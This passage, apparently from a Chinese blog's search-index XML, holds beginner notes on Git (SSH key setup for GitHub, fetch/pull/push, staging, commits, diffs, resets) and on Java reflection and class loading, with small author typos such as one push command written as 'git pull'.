class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Enter same passphrase again:</span></span><br></pre></td></tr></table></figure><p>接下来，就会出现代码提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Your identification has been saved <span class="keyword">in</span> /c/Users/yourusersname/.ssh/id_rsa.</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Your public key has been saved <span class="keyword">in</span> /c/Users/yourusersname/.ssh/id_rsa.pub.</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>意味着你的<code>SSH Key</code>就创建好了，公钥就是<code>/c/Users/yourusersname/.ssh/id_rsa.pub</code>、私钥是<code>/c/Users/yourusersname/.ssh/id_rsa</code>。</p><p>第三步，添加<code>SSH Key</code>至Github。</p><p>用任何文本编辑器打开你的公钥<code>id_rsa.pub</code>，复制文件内所有信息。</p><p>打开你的Github，点击你的头像，选择<code>settings</code>，然后再<code>Access</code>中找到<code>SSH and GPG keys</code>选项，选择<code>New SSH key</code>。</p><p><img src="https://image.icewindy.cn/202204242038466.png" alt="image-20220424203852243"></p><p>在<code>title</code>填入你想给这个<code>SSH Key</code>的备注，在<code>Key</code>中粘贴进刚刚复制的信息，点击<code>Add SSH key</code>即可。</p><p>这样就添加成功<code>SSH Key</code>了。</p><p>第四步，测试SSH Key。</p><p>打开Git Bash，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>出现提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">The authenticity of host <span class="string">&#x27;github.com (207.97.227.239)&#x27;</span> can<span class="string">&#x27;t be established.</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">RSA key fingerprint is （你的密钥）</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">Are you sure you want to continue connecting (yes/no)?</span></span></span><br></pre></td></tr></table></figure><p>输入<code>yes</code>即可，若创建时使用了密码，这时就需要输入你的密码。</p><p>完成后就会出现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Hi username! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">provide shell access.</span></span></span><br></pre></td></tr></table></figure><p>这样，你的Github的SSH设置就算完成了。</p><p>接下来初始化的步骤，与HTTPS几乎没有什么区别，按照Github上提示完成即可。</p><p>[^参考资料2]: <a href="https://docs.github.com/cn/authentication/connecting-to-github-with-ssh">使用 SSH 连接到 GitHub - GitHub Docs</a></p><h4 id="从远程仓库更新">从远程仓库更新</h4><p>有两种方法，第一种比较安全，第二种比较方便。</p><h5 id="git-fetch">git fetch</h5><p>我们需要两个步骤：</p><ol><li>从远程仓库中抓取与拉取</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch &lt;remote&gt;</span><br></pre></td></tr></table></figure><p>这个命令可以从远程仓库中下载数据到本地仓库，但没有进行合并。</p><p>我们clone了一个远程仓库，命令会自动将远程仓库命名为<code>origin</code>，一般来说，我们在本地仓库的文件夹内，使用<code>origin</code>作为<code>&lt;remote&gt;</code>即可，即</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin</span><br></pre></td></tr></table></figure><ol start="2"><li>合并到本地仓库分支</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;remote&gt;/&lt;branch&gt;</span><br></pre></td></tr></table></figure><p>这个命令的意思是，将<code>&lt;remote&gt;/&lt;branch&gt;</code>分支与主合并。</p><p><code>&lt;remote&gt;/&lt;branch&gt;</code>是我们从远程仓库下载下来的分支，在Github中，主分支被命名为<code>main</code>，因此，我们从Github远程仓库下载下来的主分支名字一般都为<code>main</code>，所以我们要将远程下载下来的主分支与本地仓库当前分支合并，运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge origin/main</span><br></pre></td></tr></table></figure><h5 id="git-pull">git pull</h5><p>这个命令相当于是将上面两个命令合二为一，即抓取数据并自动尝试合并到当前所在的分支。使用很简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull &lt;remote&gt; &lt;remote branch&gt;:&lt;local branch&gt;</span><br></pre></td></tr></table></figure><p>意思是从<code>remote</code>远程仓库中拉取<code>remote branch</code>分支，并与本地的<code>local branch</code>分支合并：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin main:main</span><br></pre></td></tr></table></figure><p>如果远程分支是与当前分支合并，则冒号后面可以省略：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin main</span><br></pre></td></tr></table></figure><h4 id="推送到远程仓库">推送到远程仓库</h4><p>推送到远程仓库的命令，与上面<code>git pull</code>的命令格式非常相似：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt;</span><br></pre></td></tr></table></figure><p>意思是将本地仓库<code>local branch</code>分支与<code>remote</code>远程仓库中的<code>remote branch</code>分支合并。</p><p>如果远程分支名与本地分支名相同，则可以省略冒号后面的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull &lt;remote&gt; &lt;local branch&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin main</span><br></pre></td></tr></table></figure><p>意思为将本地的<code>mian</code>分支推送到远程仓库，并于其中的<code>main</code>分支合并。</p><p>使用这个命令，我们还可以删除远程仓库中的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin --delete testbranch</span><br></pre></td></tr></table></figure><p>意思是删除远程仓库中<code>testbranch</code>分支。</p>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门笔记（1）：基本知识与基本操作</title>
      <link href="/2022/04/19/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2022/04/19/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="git入门笔记-一">Git入门笔记（一）</h2><p>Git是一个非常常用的版本控制软件，很多被广泛使用的软件项目都是使用Git进行版本控制的。</p><p>本教程将不包括基础的安装流程。</p><h3 id="git文件的三种状态">Git文件的三种状态</h3><p>使用Git进行操作软件时，文件状态有三种：</p><table><thead><tr><th>状态</th><th>描述</th></tr></thead><tbody><tr><td>已提交(committed)</td><td>表示文件已经保存在本地Git库中。</td></tr><tr><td>已修改(modifiled)</td><td>表示文件已修改，但暂未保存到Git库中。</td></tr><tr><td>已暂存(staged)</td><td>表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。</td></tr></tbody></table><p>由于Git提交文件到Git库时，并不是直接从工作区直接到Git库的，中间存在一个暂存区(staging area)，这个过程的文件就被称之为<code>已暂存</code>。</p><h4 id="git项目的三个工作区域">Git项目的三个工作区域</h4><p>针对Git文件的三种状态，Git项目分为三个区域：</p><table><thead><tr><th>区域</th><th>描述</th></tr></thead><tbody><tr><td>工作区</td><td>简单来说就是本地看到的目录。</td></tr><tr><td>暂存区(stage / index)</td><td>一般存放在<code>.git</code>目录下，里面包含了Git自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针<code>HEAD</code>。</td></tr><tr><td>Git仓库(版本库)</td><td>工作区下隐藏的目录<code>.git</code>，是Git的版本库（仓库）。</td></tr></tbody></table><h4 id="git基本工作流程">Git基本工作流程</h4><ul><li>工作区修改文件</li><li>对修改后的文件暂存</li><li>提交更新，将暂存的文件转储到Git仓库内</li></ul><h3 id="创建仓库与提交文件">创建仓库与提交文件</h3><h4 id="初始化git本地仓库">初始化Git本地仓库</h4><p>在Git的命令行窗口，使用<code>git init</code>命令可以在本地初始化一个空仓库。</p><img src="https://image.icewindy.cn/202204201215657.png" alt="image-20220420121506627" style="zoom:125%;" /><h4 id="提交文件至暂存区">提交文件至暂存区</h4><p>我们可以使用<code>git add &lt;path&gt;</code>的命令，使一个位于<code>path</code>的文件或者目录添加至暂存区。</p><img src="https://image.icewindy.cn/202204201221833.png" alt="image-20220420122135812" style="zoom:130%;" /><p>之后我们可以通过<code>git status</code>的命令，查看工作区与暂存区的文件状态。该命令可以查看到哪些修改被暂存，哪些修改没有，或是哪些文件没有被git追踪到（Untracked files）。</p><p><img src="https://image.icewindy.cn/202204201222564.png" alt="image-20220420122243543"></p><h4 id="提交至本地仓库">提交至本地仓库</h4><p>执行<code>git commit</code>命令可以提交暂存区的文件至本地仓库中。通常在使用该命令时，会选择加入<code>-m &lt;text&gt;</code>参数，我们可以在<code>&lt;text&gt;</code>处填入本次提交的说明。</p><img src="https://image.icewindy.cn/202204201237212.png" alt="image-20220420123716186" style="zoom: 67%;" /><p>如果加入<code>-a &lt;file&gt;</code>参数，我们将不需要执行<code>git add</code>命令，直接将<code>file</code>提交至本地仓库。</p><p>我们也可以在<code>git commit</code>后加入<code>&lt;file1&gt; &lt;file2&gt; ....</code>文件参数，指定暂存区的某文件到本地仓库。</p><h4 id="查看提交日志信息">查看提交日志信息</h4><p>使用<code>git log</code>命令，我们可以查看到提交日志信息。</p><img src="https://image.icewindy.cn/202204201238061.png" alt="image-20220420123842023" style="zoom: 80%;" /><h4 id="修改文件并提交">修改文件并提交</h4><p>实际上修改文件并提交的过程与上面新增一个文件并提交的过程并无太大差异。</p><p>首先我们可以用<code>git status</code>命令来查看我们已修改（modified）的文件。</p><p><img src="https://image.icewindy.cn/202204201351883.png" alt="image-20220420135140855"></p><p>我们可以得知的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">On branch master 在主分支</span><br><span class="line">Changes not staged for commit: 更改没有被保存至暂存区</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed) 使用git add命令保存更改至暂存区</span><br><span class="line">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory) 使用git restore放弃工作区的更改</span><br><span class="line">        modified:   git2.md 已更改文件： git2.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;) 没有要提交的更改（可以使用git add或git commit -a提交更改）</span><br></pre></td></tr></table></figure><p>通常的，我们会使用<code>git status -s</code>来获取简短的输出结果：</p><p><img src="https://image.icewindy.cn/202204201405965.png" alt="image-20220420140501938"></p><p>一个红色的M表示更改未保存至暂存区，一个绿色M表示更改已保存至暂存区，当同时出现一个红和一个绿M时候，则表示添加至暂存区后又发生了更改。</p><p>我们使用<code>git add</code>提交后，就可以执行<code>git commit -m</code>来使我们暂存区的更改保存到本地仓库中了。</p><h4 id="比较文件不同">比较文件不同</h4><p>我们使用<code>git diff &lt;file&gt;</code>命令，可以比较文件的不同，当不加入额外参数时，它的作用是查看尚未保存至暂存区的更改。</p><p><img src="https://image.icewindy.cn/202204201426753.png" alt="image-20220420142630702"></p><p>当我们加入<code>--cached</code>或是<code>--staged</code>参数时，作用是查看已保存至暂存区的更改。</p><p><img src="https://image.icewindy.cn/202204201427778.png" alt="image-20220420142702736"></p><p>当我们加入<code>HEAD</code>参数时，我们将可以看到已保存至暂存区和未保存的全部更改。</p><p><img src="https://image.icewindy.cn/202204201430943.png" alt="image-20220420143033890"></p><p>而<code>--stat</code>参数的加入，可以使其仅展示摘要，而不是完整的修改内容。</p><p><img src="https://image.icewindy.cn/202204201432715.png" alt="image-20220420143210685"></p><h4 id="撤销暂存区更改">撤销暂存区更改</h4><p>执行<code>git reset HEAD &lt;file&gt;</code>我们可以撤销已保存至暂存区的更改。</p><p><img src="https://image.icewindy.cn/202204201439223.png" alt="image-20220420143909172"></p><h3 id="版本回退">版本回退</h3><h4 id="查看提交历史">查看提交历史</h4><p>在学习版本回退之前，先补充一下<code>git log</code>指令的相关参数详解。</p><p><code>--oneline </code>参数可以查看历史记录的简洁版本。</p><img src="https://image.icewindy.cn/202204211604452.png" alt="image-20220421160458412" style="zoom: 70%;" /><p><code>--graph</code>参数可以以拓扑图的形式，展示历史中出现的分支、合并。</p><p><code>--reverse</code>参数用于逆向显示日志。</p><p><code>--author=name</code>参数用于查询名为<code>name</code>这个人的提交日志。</p><p><code>-&lt;number&gt;</code>参数可以显示近<number>次数的提交日志。</p><h4 id="版本回退">版本回退</h4><p>前面我们提及了一个撤销暂存区更改的命令<code>git reset HEAD &lt;file&gt;</code>，实际上这个命令是版本回退命令的一个使用，现在我们来详解这个命令。</p><p><code>--hard</code>参数撤销工作区所有未提交的修改内容，将工作区与暂存区都回退到上一个版本。</p><p><code>HEAD</code>参数：</p><ul><li><code>HEAD</code>表示当前版本</li><li><code>HEAD^</code>表示上版本，以此类推，<code>HEAD^^</code>表示上上个版本等等</li><li><code>HEAD~0</code>表示当前版本</li><li><code>HEAD~1</code>表示上个版本，以此类推，<code>HEAD~50</code>表示上50个版本</li></ul><img src="https://image.icewindy.cn/202204221627089.png" alt="image-20220422162741046" style="zoom:50%;" /><p><code>aabbcc</code>这个aabbcc代表的是版本唯一的标识码，我们可以用这个参数来指定回退到某以aabbcc作为版本唯一标识码的版本。</p><p>当我们后悔了，需要“回到未来”怎么办呢，我们可以用到<code>git reflog</code>的命令，来查看你每一次的操作，并且获得操作的标识码，这样就可以获得某个版本的<code>commit id</code>，也就是标识码了。</p><img src="https://image.icewindy.cn/202204221632822.png" alt="image-20220422163214788" style="zoom: 67%;" /><img src="https://image.icewindy.cn/202204221627655.png" alt="image-20220422162701602" style="zoom: 50%;" /><h3 id="文件从本地仓库恢复">文件从本地仓库恢复</h3><p>如果我们在工作区误删了文件，我们需要用到一个命令<code>git checkout -- &lt;file&gt;</code>，这个命令可以帮助我们从本地仓库中恢复<code>file</code>文件。</p><img src="https://image.icewindy.cn/202204221648927.png" alt="image-20220422164852884" style="zoom: 50%;" /><h3 id="文件删除">文件删除</h3><p>首先，我们可以在资源管理器中将工作区的文件删除，使用<code>git status</code>就可以看到我们确实删除了一个文件。</p><img src="https://image.icewindy.cn/202204221656455.png" alt="image-20220422165616423" style="zoom: 67%;" /><p>然后我们可以使用<code>git rm &lt;file&gt; </code>的指令，确定删除该文件，接着我们用<code>git commit</code>将我们这个更改上传至本地仓库，这样文件就在本地仓库被删除了。</p><img src="https://image.icewindy.cn/202204221701131.png" alt="image-20220422170159105" style="zoom: 67%;" />]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（7）：反射</title>
      <link href="/2022/03/31/Java%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%EF%BC%9A%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/03/31/Java%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%EF%BC%9A%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="反射">反射</h2><p>据我们所知，Java是一种静态语言。但是Java却可以通过<code>Reflection（反射）</code>实现动态语言的特性，反射机制允许在执行期间借助<code>Reflection API</code>取得任何类的内部信息，并且能直接操作任意对象的内部属性及方法。</p><p>反射对象相当于是一面镜子，通过镜子，&quot;反射&quot;得到对象的信息：某个类的属性、方法、构造器、实现的接口。</p><h3 id="获得反射对象">获得反射对象</h3><h4 id="通过对象获得">通过对象获得</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> person.getClass();</span><br></pre></td></tr></table></figure><h4 id="通过forname获得">通过<code>forname</code>获得</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;cn.icewindy.test.Person&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="通过类名-class获得">通过类名.class获得</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Person.class;</span><br></pre></td></tr></table></figure><p>验证一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;c1:%s,c2:%s,c3:%s\n&quot;</span>, c1.hashCode(), c2.hashCode(), c3.hashCode());<span class="comment">//output:c1:295530567,c2:295530567,c3:295530567</span></span><br></pre></td></tr></table></figure><h4 id="基本内置类型的包装类都有一个type属性">基本内置类型的包装类都有一个<code>TYPE</code>属性</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> Integer.TYPE;</span><br></pre></td></tr></table></figure><h4 id="获得父类类型">获得父类类型</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> student.getClass();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> c4.getSuperclass();</span><br><span class="line">System.out.printf(<span class="string">&quot;c5:%s\n&quot;</span>, c5.hashCode());<span class="comment">//output:c5:295530567</span></span><br></pre></td></tr></table></figure><h3 id="拥有class对象的类型">拥有Class对象的类型</h3><p>class 各种类、interface 接口、[] 数组、enum 枚举、annotation 注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Object.class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Comparable.class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> String[].class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="type">int</span>[][].class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> Override.class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c6</span> <span class="operator">=</span> ElementType.class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c7</span> <span class="operator">=</span> Integer.class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c8</span> <span class="operator">=</span> <span class="keyword">void</span>.class;<span class="comment">//小写v表示void基本数据类型，大写V表示void的自动装箱类型</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c9</span> <span class="operator">=</span> Class.class;</span><br><span class="line"></span><br><span class="line">System.out.println(c1);<span class="comment">//output:class java.lang.Object</span></span><br><span class="line">System.out.println(c2);<span class="comment">//output:class java.lang.Comparable</span></span><br><span class="line">System.out.println(c3);<span class="comment">//output:class [Ljava.lang.String; ,一维数组用一个[</span></span><br><span class="line">System.out.println(c4);<span class="comment">//output:class [[I ,二维数组用两个[</span></span><br><span class="line">System.out.println(c5);<span class="comment">//output:interface java.lang.Override</span></span><br><span class="line">System.out.println(c6);<span class="comment">//output:enum java.lang.annotation.ElementType</span></span><br><span class="line">System.out.println(c7);<span class="comment">//output:class java.lang.Integer</span></span><br><span class="line">System.out.println(c8);<span class="comment">//output:void</span></span><br><span class="line">System.out.println(c9);<span class="comment">//output:class java.lang.Class</span></span><br></pre></td></tr></table></figure><h3 id="类加载过程分析">类加载过程分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">System.out.println(a.m);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 1.加载到内存，产生一个类对应的java.lang.Class对象</span></span><br><span class="line"><span class="comment"> * 2.链接JVM，为类变量（静态变量）分配内存并设置为默认初始化值</span></span><br><span class="line"><span class="comment"> * 3.初始化类，调用类构造器&lt;clinit&gt;()将代码块合并</span></span><br><span class="line"><span class="comment"> * &lt;clinit&gt;()&#123;</span></span><br><span class="line"><span class="comment"> * System.out.println(&quot;A静态代码块初始化&quot;);</span></span><br><span class="line"><span class="comment"> *    m = 300;</span></span><br><span class="line"><span class="comment"> * m = 100;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;A静态代码块初始化&quot;</span>);</span><br><span class="line">m = <span class="number">300</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;A构造函数初始化&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>out:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A静态代码块初始化</span><br><span class="line">A构造函数初始化</span><br><span class="line">100</span><br></pre></td></tr></table></figure><h4 id="类的初始化发生">类的初始化发生</h4><h5 id="类的主动引用-会发生初始化">类的主动引用（会发生初始化）</h5><ol><li>JVM启动，初始化main方法所在的类</li><li>new一个类的对象</li><li>调用类的静态成员（除了常量final）和静态方法</li><li>使用<code>java.lang.reflect</code>包的方法对类进行反射调用</li><li>当初始化一个类，如果父类没有被初始化，则先初始化父类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Main类被加载&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"><span class="type">Son</span> <span class="variable">son</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line"><span class="comment">/*out:</span></span><br><span class="line"><span class="comment"> * Main类被加载 --1</span></span><br><span class="line"><span class="comment"> * 父类被加载   --5</span></span><br><span class="line"><span class="comment"> * 子类被加载   --2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Class.forName(<span class="string">&quot;cn.icewindy.test.Son&quot;</span>);</span><br><span class="line"><span class="comment">/*out: --4</span></span><br><span class="line"><span class="comment"> * Main类被加载</span></span><br><span class="line"><span class="comment"> * 父类被加载</span></span><br><span class="line"><span class="comment"> * 子类被加载</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;父类被加载&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;子类被加载&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="类的被动引用-不会发生初始化">类的被动引用（不会发生初始化）</h5><ol><li>当访问一个静态域，只有真正申明这个域的类才会被初始化。如：通过子类引用父类的静态变量，不会导致子类初始化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Father.a);</span><br><span class="line">System.out.println(Son.a);</span><br><span class="line"><span class="comment">/* out:    --1</span></span><br><span class="line"><span class="comment"> * Main类被加载</span></span><br><span class="line"><span class="comment"> * 父类被加载</span></span><br><span class="line"><span class="comment"> * 1</span></span><br><span class="line"><span class="comment"> * 1</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>通过数组定义类的引用，不会发生此类初始化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Son[] arraySon = <span class="keyword">new</span> <span class="title class_">Son</span>[<span class="number">5</span>];<span class="comment">//out: Main类被加载</span></span><br></pre></td></tr></table></figure><ol start="3"><li>引用常量不会触发类的初始化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Son.b);</span><br><span class="line"><span class="comment">/* out:</span></span><br><span class="line"><span class="comment"> * Main类被加载</span></span><br><span class="line"><span class="comment"> * 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 